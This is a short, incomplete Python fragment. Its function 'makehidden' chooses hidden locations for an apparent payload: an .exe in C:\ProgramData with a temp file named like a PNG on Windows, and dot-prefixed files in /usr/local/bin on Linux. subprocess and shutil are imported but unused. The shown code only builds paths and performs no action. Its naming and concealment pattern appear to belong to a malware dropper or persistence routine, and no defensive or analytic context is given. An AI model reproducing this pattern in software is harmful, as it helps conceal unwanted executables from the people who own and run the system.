import os
import sys
import time
import subprocess
import shutil
from pathlib import Path


def makehidden():
    try:
        time.sleep(1)  # Initial delay

        # Determine target path based on OS
        if sys.platform == "win32":
            target_path = "C:\\ProgramData\\"
            target_file = "s_win32.exe"
            temp_file = "simg.png"
        else:
            target_path = "/usr/local/bin/"
            target_file = ".s_linux"
            temp_file = ".s_img"

        target_file_path = os.path.join(target_path, target_file)
        temp_file_path = os.path.join(target_path, temp_file)

    except Exception as e:
        print(f"Unexpected error in makehidden: {e}")
        return False
